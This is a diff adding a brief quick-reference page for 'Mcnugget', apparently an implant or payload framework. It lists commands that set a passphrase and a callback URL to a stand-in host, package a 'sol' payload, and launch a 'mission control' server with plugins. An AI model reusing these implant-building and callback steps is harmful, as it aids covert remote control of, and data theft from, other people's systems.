@@ -1,0 +1,28 @@
+
+                        Mcnugget 3 QuickRef
+MCNUGGET_V4.0_User_Guide.pdf
+How to Mcnugget 3.0
+ 
+Create mcnugget configuration file. Below is a sample, see mission control documentation for more options and details.
+./mc_creator plist \
+	--passphrase "passphrase" \
+	--url http://callbackhost.com:8080 \
+	--server-port 8080 \
+	-t myid mc.plist
+Create a sol payload.
+./solcreate mc.plist AQarmv7pkg.zip -t myid -o myid.sol 
+ 
+Create mission control server
+./mc_creator server mctest mc.plist mcplugins/mcp_* myid.sol 
+
+Attachments:
+
+MCNUGGET_V4.0_User_Guide.pdf
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+|
+                    
